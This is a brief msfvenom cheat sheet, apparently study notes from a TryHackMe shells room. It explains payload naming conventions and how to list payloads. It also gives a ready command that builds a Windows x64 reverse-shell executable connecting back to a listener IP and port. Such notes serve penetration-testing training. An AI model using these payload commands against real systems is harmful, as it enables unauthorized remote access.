### msfvenom

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

### Standard msfvenom Syntax
```
msfvenom -p [PAYLOAD] [OPTIONS]
```
Generate a Windows x64 Reverse Shell:
```
msfvenom -p windows/x64/shell/reverse_tcp -f [FORMAT] -o [OUTPUT-FILE] LHOST=[LISTEN-IP] LPORT=[LISTEN-PORT]
```
Example:
```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.86.86 LPORT=4774
```

*********************************************************************************

### Payload Naming Conventions

Basic Convention:
```
[OS]/[ARCH]/[PAYLOAD]
```
Example:
```
linux/x86/shell_reverse_tcp
```
Windows 32bit Exception Example:
```
windows/shell_reverse_tcp
```
Stageless payloads are denoted with underscores _
```
shell_reverse_tcp
```
Staged payloads are denoted with another forward slash /
```
shell/reverse_tcp
```
This rule applies to Meterpreter payloads
Windows 64bit staged Meterpreter payload Example:
```
windows/x64/meterpreter/reverse_tcp
```
Linux 32bit stageless Meterpreter payload Example:
```
linux/x86/meterpreter_reverse_tcp
```

*********************************************************************************

### List All Available Payloads
```
msfvenom --list payloads
```
Can be used with grep:
```
msfvenom --list payloads | grep "linux/x86/meterpreter"
```

*********************************************************************************

### Reference
https://tryhackme.com/room/introtoshells
